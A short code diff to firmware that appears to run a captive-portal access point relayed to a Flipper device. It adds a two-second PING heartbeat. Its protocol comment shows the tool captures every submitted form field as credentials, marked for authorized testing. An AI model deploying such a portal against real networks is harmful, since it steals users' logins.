@@ -11,6 +11,7 @@
 //   BYE mac=<mac>    (a station left the AP)
 //   IP mac=<mac> ip=<ip>   (DHCP assigned a station its IP)
 //   CRED <urlencoded>   (all submitted form fields, one line per submission)
+//   PING             (~every 2s liveness beacon so the Flipper detects unplug)
 //
 // Authorized testing only.
 
@@ -252,4 +253,14 @@ void setup() {
 void loop() {
     if(portalRunning) dnsServer.processNextRequest();
     pumpSerial();
+
+    // Heartbeat: a periodic liveness beacon so the Flipper can tell the board is
+    // still attached (it shows "Broadcasting" until told otherwise). If the board
+    // is unplugged, these stop and the Flipper flags the link as lost.
+    static uint32_t lastPing = 0;
+    uint32_t now = millis();
+    if(now - lastPing >= 2000) {
+        lastPing = now;
+        emitLine("PING");
+    }
 }
